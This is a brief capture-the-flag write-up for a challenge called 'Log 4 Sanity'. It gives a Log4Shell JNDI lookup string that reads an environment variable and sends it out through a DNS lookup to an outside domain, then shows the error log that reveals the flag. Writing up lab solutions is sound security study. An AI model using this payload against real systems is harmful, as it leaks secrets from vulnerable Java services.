# Log 4 Sanity
I've overthought this task, but in the end what worked is just:
```
${jndi:dns:kot.pl/${env:FLAG}}
```
In the error message (shown in the terminal! Ugh) we see:
```
2021-12-19 16:52:52,357 main WARN Error looking up JNDI resource [dns:kot.pl/hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}]. javax.naming.InvalidNameException: Label exceeds 63 octets: pl/hxp{

```
